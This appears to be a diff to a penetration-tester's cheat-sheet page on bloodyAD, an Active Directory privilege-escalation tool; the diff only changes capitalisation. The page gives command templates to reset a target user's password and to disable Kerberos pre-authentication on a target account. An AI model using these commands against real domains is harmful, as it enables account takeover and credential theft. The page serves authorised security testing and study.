@@ -49,17 +49,17 @@
     <main>
 
     
-    <h1>bloodyAD</h1>
+    <h1>BloodyAD</h1>
 
-<p>bloodyAD is an active directory privesc swiss army knife.</p>
+<p>BloodyAD is an Active Directory privesc swiss army knife.</p>
 
-<h2>commands</h2>
+<h2>Commands</h2>
 
-<div class="highlight"><pre class="highlight shell"><code><span class="c"># change target user's password if we have</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Change target user's password if we have</span>
 <span class="c"># GenericAll or GenericWrite permissions:</span>
 bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-d</span> &lt;DC name with domain, all lowercase&gt; <span class="nt">--host</span> &lt;DC or host IP&gt; <span class="nb">set </span>password &lt;target username&gt; <span class="s1">'&lt;new password&gt;'</span>
 
-<span class="c"># enable DONT_REQ_PREAUTH with bloodyAD</span>
+<span class="c"># Enable DONT_REQ_PREAUTH with bloodyAD</span>
 <span class="c"># if we have GenericWrite or GenericAll</span>
 <span class="c"># permissions, from attack box:</span>
 bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-d</span> &lt;DC name with domain, all lowercase&gt; <span class="nt">--host</span> &lt;DC or host IP&gt; add uac <span class="nt">-f</span> DONT_REQ_PREAUTH &lt;target username&gt;
